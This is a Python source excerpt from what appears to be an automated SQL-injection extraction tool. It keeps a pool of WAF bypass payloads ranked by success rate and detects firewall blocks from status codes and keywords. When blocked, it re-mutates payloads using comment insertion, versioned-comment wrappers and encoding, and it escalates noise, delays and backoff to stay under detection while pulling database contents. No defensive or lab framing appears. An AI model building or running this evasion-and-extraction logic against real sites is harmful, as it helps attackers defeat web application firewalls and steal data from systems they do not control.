class BypassQuality(Enum):
    """Quality levels for bypass payloads"""
    EXCELLENT = 5  # >95% reliability
    GOOD = 4       # 85-95% reliability  
    FAIR = 3       # 70-85% reliability
    POOR = 2       # 50-70% reliability
    BURNED = 1     # <50% reliability (blocked)

@dataclass
class BypassPayload:
    """Single bypass payload with metadata"""
    payload: str
    seed: int
    confidence: float
    quality: BypassQuality = BypassQuality.GOOD
    success_count: int = 0
    failure_count: int = 0
    last_success: float = 0
    last_failure: float = 0
    burned: bool = False
    
    @property
    def success_rate(self) -> float:
        """Calculate success rate"""
        total = self.success_count + self.failure_count
        return self.success_count / total if total > 0 else 1.0
    
    @property
    def quality_score(self) -> float:
        """Calculate overall quality score (0–100, higher = better)."""
        # FIX-SCORE: Starting at 100 meant a burned bypass with 0% success still
        # scored ~90 before the complexity penalty, making pop-size enforcement
        # keep bad payloads forever. Start at 0 so score is purely additive.
        score = 0.0
        
        # Success rate component (60%)
        score += self.success_rate * 60
        
        # Recency bonus (20%)
        if self.last_success > 0:
            age = time.time() - self.last_success
            recency_bonus = max(0, 20 * (1 - age / 3600))  # Decay over 1 hour
            score += recency_bonus
        
        # Payload complexity (10%) - simpler is better
        complexity_penalty = min(10, len(self.payload) / 20)
        score -= complexity_penalty
        
        # Confidence component (10%)
        score += self.confidence * 10
        
        return max(0, min(100, score))
    
    def update_quality(self):
        """Update quality level based on success rate"""
        rate = self.success_rate
        if rate >= 0.95:
            self.quality = BypassQuality.EXCELLENT
        elif rate >= 0.85:
            self.quality = BypassQuality.GOOD
        elif rate >= 0.70:
            self.quality = BypassQuality.FAIR
        elif rate >= 0.50:
            self.quality = BypassQuality.POOR
        else:
            self.quality = BypassQuality.BURNED
            self.burned = True

class BypassPool:
    """Manages pool of alternative bypass payloads"""
    
    def __init__(self, max_size: int = 5):
        self.bypasses: List[BypassPayload] = []
        self.max_size = max_size
        self.current_index = 0
        self.total_switches = 0
        
    def add_bypass(self, payload: str, seed: int, confidence: float):
        """Add a new bypass to the pool"""
        if len(self.bypasses) >= self.max_size:
            # Remove lowest quality bypass
            self.bypasses.sort(key=lambda b: b.quality_score)
            self.bypasses.pop(0)
        
        bypass = BypassPayload(
            payload=payload,
            seed=seed,
            confidence=confidence,
            last_success=time.time()
        )
        self.bypasses.append(bypass)
        
        # Sort by quality score
        self.bypasses.sort(key=lambda b: b.quality_score, reverse=True)
    
    def get_current(self) -> Optional[BypassPayload]:
        """Get current active bypass"""
        if not self.bypasses:
            return None
        return self.bypasses[self.current_index]
    
    def get_next(self) -> Optional[BypassPayload]:
        """Switch to next available bypass"""
        if not self.bypasses:
            return None
        
        # Mark current as having issue
        current = self.get_current()
        if current:
            current.failure_count += 1
            current.last_failure = time.time()
            current.update_quality()
        
        # Find next non-burned bypass
        attempts = 0
        while attempts < len(self.bypasses):
            self.current_index = (self.current_index + 1) % len(self.bypasses)
            next_bypass = self.bypasses[self.current_index]
            
            if not next_bypass.burned:
                self.total_switches += 1
                print(f"[i] [BypassPool] Switched to bypass #{self.current_index + 1} "
                      f"(quality: {next_bypass.quality.name}, score: {next_bypass.quality_score:.1f})")
                return next_bypass
            
            attempts += 1
        
        # All bypasses burned
        return None
    
    def record_success(self):
        """Record successful use of current bypass"""
        current = self.get_current()
        if current:
            current.success_count += 1
            current.last_success = time.time()
            current.update_quality()
    
    def record_failure(self):
        """Record failed use of current bypass"""
        current = self.get_current()
        if current:
            current.failure_count += 1
            current.last_failure = time.time()
            current.update_quality()
    
    def has_alternatives(self) -> bool:
        """Check if there are non-burned alternatives"""
        return any(not b.burned for b in self.bypasses)
    
    def get_stats(self) -> Dict[str, Any]:
        """Get pool statistics"""
        if not self.bypasses:
            return {"count": 0}
        
        return {
            "count": len(self.bypasses),
            "current_index": self.current_index,
            "total_switches": self.total_switches,
            "quality_distribution": {
                "excellent": sum(1 for b in self.bypasses if b.quality == BypassQuality.EXCELLENT),
                "good": sum(1 for b in self.bypasses if b.quality == BypassQuality.GOOD),
                "fair": sum(1 for b in self.bypasses if b.quality == BypassQuality.FAIR),
                "poor": sum(1 for b in self.bypasses if b.quality == BypassQuality.POOR),
                "burned": sum(1 for b in self.bypasses if b.burned)
            },
            "avg_success_rate": statistics.mean(b.success_rate for b in self.bypasses),
            "best_quality_score": max(b.quality_score for b in self.bypasses)
        }

# ============================================================================
# PHASE 1: WAF Block Detection
# ============================================================================

class WAFBlockPattern(Enum):
    """Types of WAF blocking patterns"""
    FREQUENCY_BASED = "frequency"  # Same pattern too many times
    RATE_BASED = "rate"            # Too many requests per minute
    PATTERN_LEARNING = "learning"  # WAF learned the pattern
    THRESHOLD_BASED = "threshold"  # Threat score exceeded
    MANUAL_RULE = "manual"         # Human added rule
    UNKNOWN = "unknown"

@dataclass
class BlockSignal:
    """Signal indicating potential WAF blocking"""
    timestamp: float
    status_code: int
    is_blocked: bool
    pattern_type: Optional[WAFBlockPattern] = None
    confidence: float = 0.0

class WAFBlockDetector:
    """
    Monitors extraction responses and detects WAF blocking patterns
    """
    
    def __init__(self, window_size: int = 20, threshold: float = 0.30):
        self.recent_signals = deque(maxlen=window_size)
        self.threshold = threshold  # 30% failure rate triggers recovery
        self.total_requests = 0
        self.total_blocks = 0
        self.blocks_by_pattern: Dict[WAFBlockPattern, int] = defaultdict(int)
        self.last_block_time = 0
        self.consecutive_blocks = 0
        
    def monitor_response(self, status_code: int, response_text: str = "",
                        response_time: float = 0) -> Optional[WAFBlockPattern]:
        """
        Monitor a response and detect if WAF is blocking
        
        Returns WAFBlockPattern if blocking detected, None otherwise
        """
        self.total_requests += 1
        
        # Check if this response indicates blocking
        is_blocked, pattern = self._is_blocked_response(status_code, response_text)
        
        signal = BlockSignal(
            timestamp=time.time(),
            status_code=status_code,
            is_blocked=is_blocked,
            pattern_type=pattern,
            confidence=self._calculate_block_confidence(status_code, response_text)
        )
        
        self.recent_signals.append(signal)
        
        if is_blocked:
            self.total_blocks += 1
            self.consecutive_blocks += 1
            self.last_block_time = time.time()
            if pattern:
                self.blocks_by_pattern[pattern] += 1
            # L4 WAF EVASION ENHANCEMENT V162: Adaptively escalate noise probe rate
            # when WAF blocks are detected.  Each confirmed block raises the noise
            # injection probability by 5% (clamped at 50%), continuously disrupting
            # the bimodal oracle distribution that triggered the WAF's ML detector.
            # _escalate_noise_probe_rate is defined at module level above StealthEngine.
            try:
                _escalate_noise_probe_rate(block_count=1)
            except Exception:
                pass  # escalation failure is never fatal
            # TECHNIQUE-8: Record the current (hv_slot, cmt_slot) combination as blocked
            # so apply_heavy_variation and _obfuscate_extraction_cond avoid it.
            # The slot indices are derived from the global request counters which
            # are accessible via _NOISE_PROBE_COUNTER (incremented per probe).
            try:
                _hv_slot_blocked = _NOISE_PROBE_COUNTER % 5
                _cmt_slot_blocked = _NOISE_PROBE_COUNTER % 7
                _record_blocked_variation_slot(_hv_slot_blocked, _cmt_slot_blocked)
            except Exception:
                pass  # TECHNIQUE-8 failure is never fatal
        else:
            self.consecutive_blocks = 0
        
        # Check if blocking pattern detected
        if self._is_blocking_pattern():
            detected_pattern = self._identify_pattern_type()
            return detected_pattern
        
        return None
    
    def _is_blocked_response(self, status_code: int, response_text: str) -> Tuple[bool, Optional[WAFBlockPattern]]:
        """Determine if response indicates WAF blocking"""
        
        # HTTP status code indicators
        block_statuses = {
            403: WAFBlockPattern.PATTERN_LEARNING,  # Forbidden
            406: WAFBlockPattern.PATTERN_LEARNING,  # Not Acceptable
            429: WAFBlockPattern.RATE_BASED,        # Too Many Requests
            503: WAFBlockPattern.RATE_BASED,        # Service Unavailable
            0: WAFBlockPattern.PATTERN_LEARNING     # Connection reset
        }
        
        if status_code in block_statuses:
            return True, block_statuses[status_code]
        
        # Response content indicators
        block_keywords = [
            'blocked', 'forbidden', 'not acceptable',
            'waf', 'firewall', 'threat detected',
            # BUG-WAF-3 FIX: removed 'security' — far too broad; any page mentioning
            # "security policy", "password security", or "login security tips" would be
            # misclassified as a WAF block, triggering spurious recovery cycles.
            'access denied', 'request denied', 'rate limit'
        ]
        
        text_lower = response_text.lower()
        for keyword in block_keywords:
            if keyword in text_lower:
                return True, WAFBlockPattern.PATTERN_LEARNING
        
        return False, None
    
    def _calculate_block_confidence(self, status_code: int, response_text: str) -> float:
        """Calculate confidence that this is a WAF block"""
        confidence = 0.0
        
        # Strong signals
        if status_code in [403, 406]:
            confidence += 0.8
        elif status_code == 429:
            confidence += 0.9
        elif status_code == 503:
            confidence += 0.7
        
        # Text-based signals
        strong_keywords = ['waf', 'blocked', 'forbidden']
        for keyword in strong_keywords:
            if keyword in response_text.lower():
                confidence += 0.3
                break
        
        return min(1.0, confidence)
    
    def _is_blocking_pattern(self) -> bool:
        """Detect if WAF is blocking based on recent signals"""
        # BUG-WAF-2 FIX: Check consecutive blocks FIRST, before the minimum window
        # guard. 4+ consecutive blocks at scan start (signals 1-4) is a clear block
        # pattern; the 10-sample minimum should not prevent its detection.
        if self.consecutive_blocks >= 4:
            return True

        if len(self.recent_signals) < 10:
            return False  # Not enough data for rate-based patterns

        # Calculate failure rate
        blocks = sum(1 for s in self.recent_signals if s.is_blocked)
        failure_rate = blocks / len(self.recent_signals)

        # Pattern 1: High overall failure rate
        if failure_rate > self.threshold:
            return True

        # Pattern 3: Sudden spike (50%+ failures in last 5 requests)
        recent_5 = list(self.recent_signals)[-5:]
        recent_blocks = sum(1 for s in recent_5 if s.is_blocked)
        if recent_blocks >= 3:  # 60%+ failure in last 5
            return True

        return False
    
    def _identify_pattern_type(self) -> WAFBlockPattern:
        """Identify the most likely blocking pattern"""
        if not self.blocks_by_pattern:
            return WAFBlockPattern.UNKNOWN
        
        # Return most common pattern
        return max(self.blocks_by_pattern.items(), key=lambda x: x[1])[0]
    
    def get_failure_rate(self) -> float:
        """Get current failure rate"""
        if not self.recent_signals:
            return 0.0
        blocks = sum(1 for s in self.recent_signals if s.is_blocked)
        return blocks / len(self.recent_signals)
    
    def reset(self):
        """Reset detection state (after successful recovery)"""
        self.recent_signals.clear()
        self.consecutive_blocks = 0
        # BUG-WAF-1 FIX: also clear per-pattern block counters so post-recovery
        # pattern identification uses fresh data, not stale pre-recovery counts.
        if hasattr(self, 'blocks_by_pattern'):
            self.blocks_by_pattern.clear()
        if hasattr(self, 'total_blocks'):
            self.total_blocks = 0

# ============================================================================
# PHASE 2: Automatic Re-Mutation
# ============================================================================

class PayloadRemutator:
    """
    Generates fresh mutations of a base payload when WAF learns pattern
    """
    
    def __init__(self, mutation_engine):
        self.mutation_engine = mutation_engine
        self.mutation_history: List[str] = []
        self.mutation_attempts = 0
        self.max_attempts_per_base = 10
        
    def generate_fresh_mutation(self, base_payload: str, avoid_previous: bool = True) -> str:
        """
        Generate a fresh mutation of the base payload.

        BUG-R6-REMUTATOR FIX (Req 6): Previous code called
          self.mutation_engine.mutate(base_payload, seed=seed, aggressive=True)
        SQLMutationEngine.mutate() only accepts (self, payload: str) — passing
        'seed' and 'aggressive' as kwargs always raised:
          TypeError: mutate() got an unexpected keyword argument 'seed'
        This silently bypassed the engine and fell to _simple_mutate(), skipping
        all 20 Req 6 mutation layers every time a real engine was present.
        Fix 1: Remove the unsupported kwargs.
        Fix 2: Call mutate_all() so ALL 20 mutation layers are applied (Req 6).
        """
        self.mutation_attempts += 1

        # Seed index for _simple_mutate variety (engine path ignores this)
        seed = self.mutation_attempts

        if self.mutation_engine is not None:
            # BUG-R6-REMUTATOR FIX: call mutate_all() (all 20 layers per Req 6).
            # mutate() alone only ran mutate_boolean_payload (1 layer).
            try:
                mutated = self.mutation_engine.mutate_all(base_payload)
            except (AttributeError, TypeError):
                # Engine lacks mutate_all — fall back to single-layer without kwargs
                try:
                    mutated = self.mutation_engine.mutate(base_payload)
                except Exception:
                    mutated = self._simple_mutate(base_payload, seed)
        else:
            mutated = self._simple_mutate(base_payload, seed)

        # If avoiding previous, keep trying until we get something new
        if avoid_previous:
            attempts = 0
            while mutated in self.mutation_history and attempts < 10:
                seed += 1
                if self.mutation_engine is not None:
                    try:
                        # Vary the seed by first applying _simple_mutate then
                        # running all 20 layers over the result for maximum variety
                        _seed_variant = self._simple_mutate(base_payload, seed)
                        _alt = self.mutation_engine.mutate_all(_seed_variant)
                        mutated = _alt if _alt else _seed_variant
                    except Exception:
                        mutated = self._simple_mutate(base_payload, seed)
                else:
                    mutated = self._simple_mutate(base_payload, seed)
                attempts += 1
        
        self.mutation_history.append(mutated)
        
        # Keep history size manageable
        if len(self.mutation_history) > 50:
            self.mutation_history = self.mutation_history[-30:]
        
        return mutated
    
    def _simple_mutate(self, payload: str, seed: int) -> str:
        """
        Simple mutation fallback when mutation_engine is not available
        
        Args:
            payload: Original payload
            seed: Mutation seed for variety
        
        Returns:
            Mutated payload
        """
        # BUG-V39-7 FIX (Req 9/15): Removed `import random` inline.
        # `random` is already imported at module level (line ~1616).
        random.seed(seed)
        
        mutations = [
            # Comment injection
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace('=', '/**/=/**/'),
            # Case variation
            lambda p: p.upper() if seed % 2 == 0 else p.lower(),
            # Encoding
            lambda p: p.replace(' ', '%20'),
            lambda p: p.replace('\'', '%27'),
            # Comment types
            lambda p: p.replace(' ', '--+'),
            lambda p: p.replace(' ', '#'),
            # Inline comments
            lambda p: f"/*!50000{p}*/",
            lambda p: f"/*{seed}*/{p}",
            # Plus variations
            lambda p: p.replace(' ', '+'),
        ]
        
        # Apply random mutation
        mutation_func = random.choice(mutations)
        return mutation_func(payload)
    
    def reset_for_new_base(self):
        """Reset state when switching to new base payload"""
        self.mutation_history.clear()
        self.mutation_attempts = 0

# ============================================================================
# RECOVERY STRATEGIES
# ============================================================================

class RecoveryStrategy(Enum):
    """Available recovery strategies"""
    SLOW_DOWN = "slow_down"
    REMUTATE = "remutate"
    SWITCH_BYPASS = "switch_bypass"
    PAUSE_RESUME = "pause_resume"
    EXPONENTIAL_BACKOFF = "exponential_backoff"
    RANDOMIZE_DELAY = "randomize_delay"
    CLEAR_COOKIES = "clear_cookies"  # BONUS for 99%
    ROTATE_USER_AGENT = "rotate_user_agent"  # BONUS for 99%

@dataclass
class RecoveryResult:
    """Result of a recovery attempt"""
    success: bool
    strategy: RecoveryStrategy
    message: str
    new_delay: Optional[float] = None
    new_payload: Optional[str] = None

class RecoveryEngine:
    """
    Executes recovery strategies when WAF blocking detected
    """
    
    def __init__(self, bypass_pool: BypassPool, remutator: PayloadRemutator):
        self.bypass_pool = bypass_pool
        self.remutator = remutator
        self.current_delay = 1.0
        self.strategy_attempts = defaultdict(int)
        self.last_successful_strategy: Optional[RecoveryStrategy] = None
        
    async def execute_recovery(self, pattern: WAFBlockPattern,
                               failure_rate: float) -> RecoveryResult:
        """
        Execute appropriate recovery strategy based on blocking pattern
        
        Returns:
            RecoveryResult with outcome
        """
        # Choose strategy based on pattern and history
        strategy = self._select_strategy(pattern, failure_rate)
        
        self.strategy_attempts[strategy] += 1
        
        print(f"[!] [Recovery] WAF blocking detected ({failure_rate*100:.1f}% failure rate)")
        print(f"[i] [Recovery] Executing strategy: {strategy.value} "
              f"(attempt #{self.strategy_attempts[strategy]})")
        
        # Execute the selected strategy
        if strategy == RecoveryStrategy.SLOW_DOWN:
            return await self._strategy_slow_down()
        elif strategy == RecoveryStrategy.REMUTATE:
            return await self._strategy_remutate()
        elif strategy == RecoveryStrategy.SWITCH_BYPASS:
            return await self._strategy_switch_bypass()
        elif strategy == RecoveryStrategy.PAUSE_RESUME:
            return await self._strategy_pause_resume()
        elif strategy == RecoveryStrategy.EXPONENTIAL_BACKOFF:
            return await self._strategy_exponential_backoff()
        elif strategy == RecoveryStrategy.RANDOMIZE_DELAY:
            return await self._strategy_randomize_delay()
        elif strategy == RecoveryStrategy.CLEAR_COOKIES:
            return await self._strategy_clear_cookies()
        elif strategy == RecoveryStrategy.ROTATE_USER_AGENT:
            return await self._strategy_rotate_user_agent()
        
        return RecoveryResult(
            success=False,
            strategy=strategy,
            message="Unknown strategy"
        )
    
    def _select_strategy(self, pattern: WAFBlockPattern, failure_rate: float) -> RecoveryStrategy:
        """Select best strategy based on pattern and context"""
        
        # If last strategy worked, try it again first
        if self.last_successful_strategy and self.strategy_attempts[self.last_successful_strategy] < 3:
            return self.last_successful_strategy
        
        # Pattern-specific strategies
        if pattern == WAFBlockPattern.RATE_BASED:
            return RecoveryStrategy.SLOW_DOWN
        elif pattern == WAFBlockPattern.FREQUENCY_BASED:
            return RecoveryStrategy.REMUTATE
        elif pattern == WAFBlockPattern.PATTERN_LEARNING:
            # Try re-mutation first, then switch if that fails
            if self.strategy_attempts[RecoveryStrategy.REMUTATE] < 3:
                return RecoveryStrategy.REMUTATE
            return RecoveryStrategy.SWITCH_BYPASS
        
        # High failure rate = more aggressive recovery
        if failure_rate > 0.5:
            return RecoveryStrategy.PAUSE_RESUME
        
        # Default escalation path
        strategies = [
            RecoveryStrategy.SLOW_DOWN,
            RecoveryStrategy.REMUTATE,
            RecoveryStrategy.SWITCH_BYPASS,
            RecoveryStrategy.EXPONENTIAL_BACKOFF,
            RecoveryStrategy.PAUSE_RESUME
        ]
        
        # Try each strategy in order
        for strategy in strategies:
            if self.strategy_attempts[strategy] < 2:
                return strategy
        
        # All strategies tried, use randomization
        return RecoveryStrategy.RANDOMIZE_DELAY
    
    async def _strategy_slow_down(self) -> RecoveryResult:
        """Strategy 1: Dramatically slow down request rate"""
        old_delay = self.current_delay
        new_delay = min(self.current_delay * 2.5, 15.0)  # Cap at 15s
        self.current_delay = new_delay
        
        print(f"[i] [Recovery] Slowing down: {old_delay:.1f}s → {new_delay:.1f}s")
        print("[i] [Recovery] Waiting 30s for WAF to cool down...")
        
        await asyncio.sleep(30)
        
        return RecoveryResult(
            success=True,
            strategy=RecoveryStrategy.SLOW_DOWN,
            message=f"Slowed to {new_delay:.1f}s delay",
            new_delay=new_delay
        )
    
    async def _strategy_remutate(self) -> RecoveryResult:
        """Strategy 2: Generate fresh payload mutation"""
        current_bypass = self.bypass_pool.get_current()
        if not current_bypass:
            return RecoveryResult(
                success=False,
                strategy=RecoveryStrategy.REMUTATE,
                message="No current bypass available"
            )
        
        print("[i] [Recovery] Generating fresh payload mutation...")
        
        new_payload = self.remutator.generate_fresh_mutation(
            current_bypass.payload,
            avoid_previous=True
        )
        
        # Update current bypass
        current_bypass.payload = new_payload
        
        print(f"[✓] [Recovery] New mutation generated: {new_payload[:50]}...")
        
        return RecoveryResult(
            success=True,
            strategy=RecoveryStrategy.REMUTATE,
            message="Payload re-mutated",
            new_payload=new_payload
        )
    
    async def _strategy_switch_bypass(self) -> RecoveryResult:
        """Strategy 3: Switch to alternative bypass from pool"""
        if not self.bypass_pool.has_alternatives():
            return RecoveryResult(
                success=False,
                strategy=RecoveryStrategy.SWITCH_BYPASS,
                message="No alternative bypasses available"
            )
        
        next_bypass = self.bypass_pool.get_next()
        if not next_bypass:
            return RecoveryResult(
                success=False,
                strategy=RecoveryStrategy.SWITCH_BYPASS,
                message="All bypasses burned"
            )
        
        # Reset mutation history for new bypass
        self.remutator.reset_for_new_base()
        
        print("[✓] [Recovery] Switched to alternative bypass")
        print(f"[i] [Recovery] Quality: {next_bypass.quality.name}, "
              f"Success rate: {next_bypass.success_rate*100:.1f}%")
        
        return RecoveryResult(
            success=True,
            strategy=RecoveryStrategy.SWITCH_BYPASS,
            message="Switched to alternative bypass",
            new_payload=next_bypass.payload
        )
    
    async def _strategy_pause_resume(self) -> RecoveryResult:
        """Strategy 4: Long pause for WAF cooldown"""
        pause_duration = 300  # 5 minutes
        
        print(f"[i] [Recovery] Pausing {pause_duration}s (5 min) for WAF cooldown...")
        
        await asyncio.sleep(pause_duration)
        
        print("[✓] [Recovery] Resuming after cooldown")
        
        return RecoveryResult(
            success=True,
            strategy=RecoveryStrategy.PAUSE_RESUME,
            message=f"Paused {pause_duration}s for cooldown"
        )
    
    async def _strategy_exponential_backoff(self) -> RecoveryResult:
        """Strategy 5: Exponential backoff with jitter"""
        attempts = self.strategy_attempts[RecoveryStrategy.EXPONENTIAL_BACKOFF]
        base_delay = min(2 ** attempts, 60)  # Cap at 60s
        jitter = random.uniform(0, base_delay * 0.5)
        total_delay = base_delay + jitter
        
        print(f"[i] [Recovery] Exponential backoff: {total_delay:.1f}s (attempt {attempts})")
        
        await asyncio.sleep(total_delay)
        
        return RecoveryResult(
            success=True,
            strategy=RecoveryStrategy.EXPONENTIAL_BACKOFF,
            message=f"Backed off {total_delay:.1f}s"
        )
    
    async def _strategy_randomize_delay(self) -> RecoveryResult:
        """Strategy 6: Randomize delays to appear more human"""
        # Random delay between 2-8 seconds
        random_delay = random.uniform(2.0, 8.0)
        self.current_delay = random_delay
        
        print(f"[i] [Recovery] Randomizing delay: {random_delay:.2f}s")
        
        return RecoveryResult(
            success=True,
            strategy=RecoveryStrategy.RANDOMIZE_DELAY,
            message=f"Randomized delay to {random_delay:.2f}s",
            new_delay=random_delay
        )
    
    async def _strategy_clear_cookies(self) -> RecoveryResult:
        """Strategy 7 (BONUS): Clear cookies to reset session"""
        # BUG-RECOVERY-1 FIX: RecoveryEngine has no session reference, so cookie
        # clearing cannot be performed here. Return success=False so _select_strategy
        # does not record this as a working strategy and re-use it on subsequent blocks.
        LOG.warning("[Recovery] CLEAR_COOKIES strategy not implemented at this level "
                    "(no session reference); returning failure to avoid no-op recovery loop")
        return RecoveryResult(
            success=False,
            strategy=RecoveryStrategy.CLEAR_COOKIES,
            message="CLEAR_COOKIES not implemented: RecoveryEngine has no session reference"
        )

    async def _strategy_rotate_user_agent(self) -> RecoveryResult:
        """Strategy 8 (BONUS): Rotate user agent to appear as different client"""
        # BUG-RECOVERY-1 FIX: RecoveryEngine has no request-sending reference, so
        # UA rotation cannot be performed here. Return success=False so _select_strategy
        # does not record this as a working strategy and re-use it on subsequent blocks.
        LOG.warning("[Recovery] ROTATE_USER_AGENT strategy not implemented at this level "
                    "(no session reference); returning failure to avoid no-op recovery loop")
        return RecoveryResult(
            success=False,
            strategy=RecoveryStrategy.ROTATE_USER_AGENT,
            message="ROTATE_USER_AGENT not implemented: RecoveryEngine has no session reference"
        )

    def record_success(self, strategy: RecoveryStrategy):
        """Record successful recovery"""
        self.last_successful_strategy = strategy
        # BUG-RECOVERY-2 FIX: reset attempt counter for the successful strategy so
        # it can be re-used when _select_strategy checks `strategy_attempts < 3`.
        self.strategy_attempts[strategy] = 0
        print(f"[✓] [Recovery] Strategy '{strategy.value}' successful!")

# ============================================================================
# ADAPTIVE EXTRACTION COORDINATOR
# ============================================================================

class AdaptiveExtractionEngine:
    """
    Main coordinator for adaptive extraction system
    Integrates all 3 phases + bonus enhancements
    """
    
    def __init__(self, mutation_engine, max_bypasses: int = 5, waf_threshold: float = 0.30):
        # Phase 3: Multi-Bypass Pool
        self.bypass_pool = BypassPool(max_size=max_bypasses)
        
        # Phase 2: Re-Mutation Engine
        self.remutator = PayloadRemutator(mutation_engine)
        
        # Phase 1: WAF Block Detection
        self.waf_detector = WAFBlockDetector(window_size=20, threshold=waf_threshold)
        
        # Recovery Engine
        self.recovery_engine = RecoveryEngine(self.bypass_pool, self.remutator)
        
        # Statistics
        self.total_extractions = 0
        self.successful_extractions = 0
        self.failed_extractions = 0
        self.recoveries_attempted = 0
        self.recoveries_successful = 0
        
        # Configuration
        self.adaptive_mode = True
        self.max_recovery_attempts = 5
        
    def add_bypass(self, payload: str, seed: int, confidence: float):
        """Add a bypass to the pool"""
        self.bypass_pool.add_bypass(payload, seed, confidence)
    
    async def extract_with_adaptation(self, extraction_func, *args, **kwargs) -> Any:
        """
        Execute extraction with full adaptive capabilities
        
        Args:
            extraction_func: Async function that performs extraction
            *args, **kwargs: Arguments to pass to extraction_func
        
        Returns:
            Result from extraction_func
        
        Raises:
            ExtractionError if all adaptation strategies fail
        """
        self.total_extractions += 1
        recovery_attempts = 0
        
        while recovery_attempts < self.max_recovery_attempts:
            try:
                # Attempt extraction
                result = await extraction_func(*args, **kwargs)

                # BUG-2 FIX: extraction_func may return either the extracted data
                # directly, or a (data, status_code, body) tuple carrying real HTTP
                # metadata.  Previously kwargs['status_code'] / kwargs['response_text']
                # were always missing → monitor_response always received (200, "") →
                # WAF block detection never fired → recovery_engine never invoked.
                _actual_result = result
                _waf_status = 200
                _waf_body = ""
                if isinstance(result, tuple) and len(result) == 3:
                    _actual_result, _waf_status, _waf_body = result
                elif isinstance(result, tuple) and len(result) == 2:
                    _actual_result, _waf_status = result

                # Monitor response (BUG-2 FIX: use real HTTP metadata when available)
                pattern = self.waf_detector.monitor_response(
                    status_code=_waf_status,
                    response_text=str(_waf_body) if _waf_body else ""
                )

                # Check if result indicates success
                if self._is_successful_result(_actual_result):
                    self.bypass_pool.record_success()
                    self.successful_extractions += 1
                    return result
                
                # Check if WAF blocking detected
                if pattern:
                    # Attempt recovery
                    recovery_attempts += 1
                    self.recoveries_attempted += 1

                    failure_rate = self.waf_detector.get_failure_rate()
                    recovery = await self.recovery_engine.execute_recovery(
                        pattern,
                        failure_rate
                    )

                    if recovery.success:
                        self.recoveries_successful += 1
                        self.recovery_engine.record_success(recovery.strategy)

                        # Reset detector after successful recovery
                        self.waf_detector.reset()

                        # Update extraction parameters if needed
                        if recovery.new_delay:
                            kwargs['delay'] = recovery.new_delay
                        if recovery.new_payload:
                            kwargs['payload'] = recovery.new_payload

                        # Retry with recovered settings
                        continue
                    else:
                        print(f"[!] [Recovery] Strategy '{recovery.strategy.value}' failed")
                else:
                    # BUG-1 FIX: no WAF pattern detected but extraction still failed —
                    # increment counter to prevent infinite loop when result is always None
                    recovery_attempts += 1

                # Record failure
                self.bypass_pool.record_failure()
                
            except Exception as e:
                print(f"[!] [Extraction] Error: {e}")
                self.bypass_pool.record_failure()
                recovery_attempts += 1
        
        # All recovery attempts exhausted
        self.failed_extractions += 1
        raise ExtractionError(
            f"Extraction failed after {recovery_attempts} recovery attempts"
        )
    
    def _is_successful_result(self, result: Any) -> bool:
        """Determine if extraction result indicates success.
        
        BUG-R7-2 FIX (Req 7): Previously returned False for empty string "".
        Empty string is a valid extraction result — it means the database column
        exists but contains an empty value (e.g., an empty password field, an
        empty description, a NULL-derived empty string).  Treating "" as failure
        triggered unnecessary WAF recovery attempts and could cause infinite retry
        loops on endpoints with genuinely empty values.
        Fix: only None is a failure (extraction didn't complete at all).
        Empty string means extraction completed successfully with an empty value.
        """
        if result is None:
            return False
        # "" is a valid result (empty column value) — treat as success
        return True
    
    def get_success_rate(self) -> float:
        """Calculate current success rate"""
        if self.total_extractions == 0:
            return 1.0
        return self.successful_extractions / self.total_extractions
    
    def get_stats(self) -> Dict[str, Any]:
        """Get comprehensive statistics"""
        return {
            "extractions": {
                "total": self.total_extractions,
                "successful": self.successful_extractions,
                "failed": self.failed_extractions,
                "success_rate": self.get_success_rate()
            },
            "recoveries": {
                "attempted": self.recoveries_attempted,
                "successful": self.recoveries_successful,
                "success_rate": self.recoveries_successful / max(1, self.recoveries_attempted)
            },
            "bypass_pool": self.bypass_pool.get_stats(),
            "waf_detection": {
                "failure_rate": self.waf_detector.get_failure_rate(),
                "total_blocks": self.waf_detector.total_blocks,
                "consecutive_blocks": self.waf_detector.consecutive_blocks
            }
        }
    
    def print_summary(self):
        """Print statistics summary"""
        stats = self.get_stats()
        
        print("\n" + "="*80)
        print("📊 ADAPTIVE EXTRACTION SUMMARY")
        print("="*80)
        
        print("\nExtractions:")
        print(f"  Total:      {stats['extractions']['total']}")
        _ext_total = stats['extractions']['total']
        _ext_pct = (f"{stats['extractions']['success_rate']*100:.1f}%"
                    if _ext_total > 0 else "N/A")
        print(f"  Successful: {stats['extractions']['successful']} ({_ext_pct})")
        print(f"  Failed:     {stats['extractions']['failed']}")
        
        print("\nRecoveries:")
        print(f"  Attempted:  {stats['recoveries']['attempted']}")
        print(f"  Successful: {stats['recoveries']['successful']} "
              f"({stats['recoveries']['success_rate']*100:.1f}%)")
        
        print("\nBypass Pool:")
        pool_stats = stats['bypass_pool']
        print(f"  Bypasses:   {pool_stats['count']}")
        if pool_stats['count'] > 0:
            print(f"  Switches:   {pool_stats['total_switches']}")
            print(f"  Avg Success: {pool_stats['avg_success_rate']*100:.1f}%")
            print(f"  Quality:    Excellent={pool_stats['quality_distribution']['excellent']}, "
                  f"Good={pool_stats['quality_distribution']['good']}, "
                  f"Fair={pool_stats['quality_distribution']['fair']}, "
                  f"Poor={pool_stats['quality_distribution']['poor']}, "
                  f"Burned={pool_stats['quality_distribution']['burned']}")
        
        print("\nWAF Detection:")
        print(f"  Failure Rate: {stats['waf_detection']['failure_rate']*100:.1f}%")
        print(f"  Total Blocks: {stats['waf_detection']['total_blocks']}")
        
        print("="*80)
        print()

class ExtractionError(Exception):
    """Raised when extraction fails after all recovery attempts"""
    pass



